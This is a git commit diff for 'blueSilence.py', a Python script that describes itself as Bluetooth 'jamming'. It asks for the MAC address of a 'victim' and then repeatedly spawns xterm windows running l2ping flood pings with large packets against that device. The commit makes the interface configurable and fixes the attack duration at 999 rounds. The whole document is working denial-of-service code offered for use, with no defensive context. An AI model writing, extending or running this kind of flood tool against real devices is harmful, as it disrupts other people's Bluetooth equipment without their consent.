8c9f1817983db6beb8935c13991d74b697c4b7ad
void <fluffy.siberian.cat@gmail.com>
2023-04-29 01:20:43 +1000

    V 1.1

--- blueSilence.py
+++ blueSilence.py
@@ -9,16 +9,16 @@ colorama.init(autoreset=True)
 def start():
     headers.header()
 start()
-
+interface = input("Your BT interface : ")
 mac = input("MAC of victim: ")
-time = input("Time of jamming: ")
+time = 999
 print("Start jamming...")
 delay = int(time)
 
 while delay != 0:
-    xterm_1 = "xterm -e 'timeout 2s l2ping -i hci0 -s 600 -f %s '" % (mac)
-    xterm_2 = "xterm -e 'timeout 2s l2ping -i hci0 -s 600 -f %s '" % (mac)
-    xterm_3 = "xterm -e 'timeout 2s l2ping -i hci0 -s 600 -f %s '" % (mac)
+    xterm_1 = "xterm -e 'timeout 2s l2ping -i %s -s 600 -f %s '" % (interface , mac)
+    xterm_2 = "xterm -e 'timeout 2s l2ping -i %s -s 600 -f %s '" % (interface , mac)
+    xterm_3 = "xterm -e 'timeout 2s l2ping -i %s -s 600 -f %s '" % (interface , mac)
     subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
     subprocess.Popen(xterm_2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
     subprocess.Popen(xterm_3, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
